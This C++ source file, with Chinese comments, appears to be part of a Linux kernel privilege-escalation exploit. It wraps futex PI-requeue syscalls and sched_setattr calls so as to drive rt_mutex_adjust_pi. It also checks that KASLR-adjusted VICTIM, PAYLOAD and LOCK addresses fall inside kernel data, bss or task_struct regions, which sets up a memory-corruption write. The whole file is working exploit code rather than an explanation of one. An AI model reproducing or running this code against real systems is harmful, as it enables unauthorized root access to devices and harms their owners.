#include <cstring>
#include <fcntl.h>
#include "prim.h"
#include "../tools.h"
#include "../const.h"
#include <string>
#include <algorithm>
#include <linux/futex.h>
#include <linux/sched/types.h>
using std::cout, std::endl, std::dec, std::hex;
std::vector<unsigned long> Prim::get_api(unsigned long n) {
    //警告：内存不一定够用，n别设太大了
    using std::cout, std::endl, std::hex, std::string, std::vector;
    Print print("GetVictim");
    const char* path = "/proc/sys/net/ipv4/tcp_mem";
    auto buf = new char[n*21+1];//留一个写'\0'
    auto fd = open(path, O_RDONLY);
    if (fd < 0) {
        print("接口打开失败=", strerror(errno));
        exit(1);
    }
    unsigned long i;
    for (i = 0; i < n*21; ) {
        auto r = read(fd, buf+i, n*21);
        if (r < 0) {
            if (errno == EINTR) continue;
            print("读取失败=", strerror(errno));
            exit(1);
        }
        if (r == 0) {
            buf[i] = '\0';
            break;
        }
        i += r;
    }
    close(fd);
    string buf2(buf, i);
    delete[] buf;
    if (*buf2.rbegin() == '\n')
        *buf2.rbegin() = '\t'; //接口最后一个字符是换行
    vector<unsigned long> v;
    for (auto it = buf2.begin(); it != buf2.end();) {
        auto res = std::find(it, buf2.end(), '\t');
        if (res != buf2.end() && v.size() < n) {
            string s(it, res);
            unsigned long num = stoul(s);
            v.push_back(num);
            it = res + 1;
        }
        else break;
    }
    if (v.empty()) {
        print("接口数据为空");
        exit(1);
    }
    return v;
}

void Prim::check_addr(int layout) {
    // 开写前地址保险（SKIP_ADDR_GUARD=1 可关）。只能兜明显越界，不保证不崩
    Print print("check_addr");
    if (!getenv("SKIP_ADDR_GUARD")) {
        if (layout >= waiter_layout.size()) {
            print("不存在 ",layout," 号waiter布局");
            exit(1);
        }
        if (SLOT > LINK_SLOT_MAX) {
            print("当前配置SLOT最大=",LINK_SLOT_MAX);
            exit(1);
        }
        cout << hex;
        unsigned long data_start = LINK_DATA_START + kaslr_slide, bss_stop = LINK_BSS_STOP + kaslr_slide,
            task_start = 0xffffffc050000000 + kaslr_slide, task_stop = 0xffffffc060000000 + kaslr_slide; //直接映射区，task_struct所在地
        if ((VICTIM < data_start || VICTIM > bss_stop) && (VICTIM < task_start || VICTIM > task_stop)) {
            print("VICTIM=",VICTIM," 越出越出内核镜像，且不在task_struct分配区");
            exit(1);
        }
        if (layout != 2) { // 2号布局PAYLOAD 固定为 0
            if ((PAYLOAD & 3ULL) != 0) {
                // parent_color要求低2位为颜色，所以无需8字节对齐
                print("PAYLOAD=",PAYLOAD," 未 4 字节对齐：");
                exit(1);
            }
            if ((PAYLOAD < data_start || PAYLOAD > bss_stop) && (PAYLOAD < task_start || PAYLOAD > task_stop)) {
                print("PAYLOAD=",PAYLOAD," 越出内核镜像，且不在task_struct分配区");
                print("PAYLOAD-KASLR=",PAYLOAD - kaslr_slide);
                exit(1);
            }
        }
        if (LOCK < LINK_BSS_START + kaslr_slide || LOCK >= LINK_BSS_STOP + kaslr_slide) {
            print("LOCK=",LOCK," 超出了bss区");
            exit(1);
        }
        cout << dec;
    }
}

long Prim::lock_pi(int *uaddr) {
    return syscall(SYS_futex, uaddr, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, 0, 0, 0);
}
long Prim::unlock_pi(int *uaddr) {
    return syscall(SYS_futex, uaddr, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0, 0, 0, 0);
}
long Prim::wait_requeue_pi(int *uaddr, int *uaddr2) {
    timespec to{};
    clock_gettime(CLOCK_MONOTONIC, &to);
    to.tv_sec += 1;
    return syscall(SYS_futex, uaddr, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, &to, uaddr2, 0);
}
long Prim::cmp_requeue_pi(int *uaddr, int *uaddr2, int cmpval) {
    return syscall(SYS_futex, uaddr, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, 0, uaddr2, cmpval);
}
long Prim::sched_setattr_batch(long tid) {
    // 每发必须真的改点东西：__sched_setscheduler() 在
    // policy == p->policy && nice 未变 时会直接 return 0，
    // 根本走不到 rt_mutex_adjust_pi(p)，这一发就白消费了。
    sched_attr a{}; a.size = sizeof(a);
    a.sched_policy = (SLOT & 1) ? SCHED_OTHER : SCHED_BATCH;
    a.sched_nice = 19;
    return syscall(SYS_sched_setattr, tid, &a, 0);
}
